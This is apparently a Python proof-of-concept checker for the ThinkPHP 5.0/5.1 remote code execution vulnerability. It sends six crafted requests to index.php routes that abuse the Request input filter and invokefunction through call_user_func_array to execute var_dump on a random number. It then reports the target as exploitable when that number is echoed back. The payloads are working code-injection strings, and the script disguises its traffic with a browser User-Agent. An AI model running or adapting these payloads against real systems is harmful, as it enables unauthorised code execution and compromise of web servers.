import requests
import random


def poc(url):
    timeout = 5
    random_num = ''.join(str(i) for i in random.sample(range(0, 9), 5))
    check_key = 'string(5) "%s"' % random_num
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'
    }
    poc_list = [
        r'/index.php?s=index/\think\Request/input&filter=var_dump&data=%s' % random_num,
        r'/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s' % random_num,
        r'/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s' % random_num,
        r'/public/index.php?s=index/\think\Request/input&filter=var_dump&data=%s' % random_num,
        r'/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s' % random_num,
        r'/public/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s' % random_num
    ]

    for check in poc_list:
        try:
            exp = url + check
            req = requests.get(exp, headers=headers, timeout=timeout, allow_redirects=False)
            if check_key in req.text:
                result = "目标存在 ThinkPHP 5.0.*/5.1.* RCE, check url: %s" % exp
                return result
        except:
            pass
